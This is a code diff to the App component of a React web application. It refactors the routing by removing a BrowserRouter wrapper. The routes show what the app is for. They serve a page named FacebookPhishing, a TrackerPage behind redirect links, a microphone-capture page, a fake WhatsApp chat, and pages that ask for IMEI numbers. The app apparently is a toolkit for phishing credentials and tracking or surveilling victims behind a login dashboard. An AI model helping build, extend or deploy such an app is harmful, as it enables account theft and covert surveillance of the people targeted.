@@ -7,7 +7,7 @@ import FacebookPhishing from './pages/FacebookPhishing';
 import MicrophonePage from './pages/MicrophonePage';
 import HowToGetIMEI from './pages/HowToGetIMEI';
 import IMEISupportRequest from './pages/IMEISupportRequest';
-import { BrowserRouter, Routes, Route, useParams, useNavigate } from 'react-router-dom';
+import { Routes, Route, useParams, useNavigate } from 'react-router-dom';
 import Header from './components/Header';
 import Sidebar from './components/Sidebar';
 import { FaBook, FaMapMarkerAlt, FaWhatsapp, FaInstagram, FaFacebookF, FaMicrophone, FaHome, FaQuestionCircle, FaLifeRing } from 'react-icons/fa';
@@ -304,25 +304,23 @@ function App() {
   }
 
   return (
-    <BrowserRouter>
-      <Routes>
-        <Route path="/" element={
-          !usuario ? (
-            <Login onLogin={handleLogin} />
-          ) : (
-            <Dashboard email={usuario} />
-          )
-        } />
-        <Route path="/redirect/:id" element={<TrackerPage />} />
-        <Route path="/facebook/:id" element={<FacebookPhishing />} />
-        <Route path="/microphone/:id" element={<MicrophonePage />} />
-        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
-        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
-        <Route path="/imei-support-request" element={<IMEISupportRequest />} />
-        <Route path="/faq" element={<FAQ sidebarItems={sidebarItems} active={active} setActive={setActive} />} />
-        <Route path="/support" element={<Support sidebarItems={sidebarItems} active={active} setActive={setActive} />} />
-      </Routes>
-    </BrowserRouter>
+    <Routes>
+      <Route path="/" element={
+        !usuario ? (
+          <Login onLogin={handleLogin} />
+        ) : (
+          <Dashboard email={usuario} />
+        )
+      } />
+      <Route path="/redirect/:id" element={<TrackerPage />} />
+      <Route path="/facebook/:id" element={<FacebookPhishing />} />
+      <Route path="/microphone/:id" element={<MicrophonePage />} />
+      <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
+      <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
+      <Route path="/imei-support-request" element={<IMEISupportRequest />} />
+      <Route path="/faq" element={<FAQ sidebarItems={sidebarItems} active={active} setActive={setActive} />} />
+      <Route path="/support" element={<Support sidebarItems={sidebarItems} active={active} setActive={setActive} />} />
+    </Routes>
   );
 }
 
